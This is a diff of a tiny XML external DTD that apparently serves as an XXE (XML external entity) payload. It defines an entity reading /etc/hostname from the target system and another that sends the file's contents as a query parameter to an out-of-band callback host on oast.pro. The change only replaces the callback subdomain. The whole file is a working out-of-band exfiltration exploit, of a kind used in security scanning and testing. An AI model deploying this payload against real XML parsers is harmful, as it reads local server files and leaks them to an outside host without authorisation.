@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % exfil SYSTEM "https://d2s2rj0bjuo1jfk296hgbxmkdlphkviwa.oast.pro/?data=%file;">
+<!ENTITY % exfil SYSTEM "https://d2smr2i7idh7to4p6p6gqpqwhltsgpebk.oast.pro/?data=%file;">
 %exfil;
